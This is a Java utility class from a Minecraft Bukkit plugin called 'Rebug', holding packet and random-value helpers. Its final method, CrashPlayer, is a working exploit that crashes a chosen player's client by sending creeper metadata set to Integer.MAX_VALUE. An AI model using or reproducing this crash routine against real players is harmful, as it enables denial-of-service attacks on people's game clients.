package me.killstorm103.Rebug.Utils;

import java.util.Random;

import org.bukkit.Bukkit;
import org.bukkit.command.CommandSender;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;

import me.killstorm103.Rebug.Main.Rebug;
import net.minecraft.server.v1_8_R3.*;

public class PT
{
	public static Class<?> getNMSClass(String name) 
	{
        try 
        {
            return Class.forName("net.minecraft.server." + Bukkit.getServer().getClass().getPackage().getName().split("\\.")[3] + "." + name);
        }
        catch (ClassNotFoundException e) 
        {
            e.printStackTrace();
            return null;
        }
    }
	public static void SendPacket(Player player, Packet<?> packet) 
	{
        try 
        {
            Object handle = player.getClass().getMethod("getHandle", new Class[0]).invoke((Object) player, new Object[0]);
            Object playerConnection = handle.getClass().getField("playerConnection").get(handle);
            playerConnection.getClass().getMethod("sendPacket", getNMSClass("Packet")).invoke(playerConnection, packet);
        }
        catch (Exception e) 
        {
            e.printStackTrace();
        }
    }
	public static double randomNumber (int max, int min) 
    {
        return (Math.random() * (max - min)) + min;
    }
	public static float randomNumber (float max, float min) 
	{
        return (float) ((Math.random() * (max - min)) + min);
    }
    public static long randomNumber (long max, long min) 
    {
        return (long) ((Math.random() * (max - min)) + min);
    }
    public static double randomNumber (double max, double min) 
    {
        return (Math.random() * (max - min)) + min;
    }
    public static boolean nextBoolean () 
    {
        return new Random().nextBoolean();
    }
	public static int nextInt (final int startInclusive, final int endExclusive) 
	{
        if (endExclusive - startInclusive <= 0) 
            return startInclusive;
        
        return startInclusive + new Random().nextInt(endExclusive - startInclusive);
    }
    
    public static double nextDouble (final double startInclusive, final double endInclusive)
    {
        if (startInclusive == endInclusive || endInclusive - startInclusive <= 0.0) 
            return startInclusive;
        
        return startInclusive + (endInclusive - startInclusive) * Math.random();
    }
    
    public static float nextFloat (final float startInclusive, final float endInclusive)
    {
        if (startInclusive == endInclusive || endInclusive - startInclusive <= 0.0f)
            return startInclusive;
        
        return (float)(startInclusive + (endInclusive - startInclusive) * Math.random());
    }
     
    public static String randomNumber (final int length) 
    {
        return random(length, "123456789");
    }
    
    public static String randomString (final int length) 
    {
        return random(length, "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz");
    }
    
    public static String random (final int length, final String chars)
    {
        return random(length, chars.toCharArray());
    }
    
    public static String random (final int length, final char[] chars)
    {
        final StringBuilder stringBuilder = new StringBuilder();
        for (int i = 0; i < length; ++i) {
            stringBuilder.append(chars[new Random().nextInt(chars.length)]);
        }
        return stringBuilder.toString();
    }
    private static EntityLiving entity = null;
    public static void CrashPlayer (CommandSender sender, Player willBeCrashed, String mode)
    {
    	entity = null;
    	if (mode != null && mode.length() > 0)
    	{
    		final EntityPlayer px = ((CraftPlayer) willBeCrashed).getHandle();
    		if (mode.equalsIgnoreCase("creeper"))
    			entity = new EntityCreeper(px.world);
    		
    		if (entity == null)
    		{
    			sender.sendMessage("Unsupported Entity");
    			return;
    		}
    		final DataWatcher dw = new DataWatcher((net.minecraft.server.v1_8_R3.Entity) entity);
            dw.a (mode.equalsIgnoreCase("creeper") ? 18 : 31, (Object) Integer.MAX_VALUE);
            Packet<?> packet_spawn;
            packet_spawn = new PacketPlayOutSpawnEntityLiving((EntityLiving) entity);
            px.playerConnection.sendPacket(packet_spawn);
            Bukkit.getScheduler().scheduleSyncDelayedTask(Rebug.getGetMain(), new Runnable()
            {
                @Override
                public void run()
                {
                    PacketPlayOutEntityMetadata meta = new PacketPlayOutEntityMetadata(entity.getId(), dw, true);
                    px.playerConnection.sendPacket(meta);
                }
            }, 5L);
    	}
    }
}
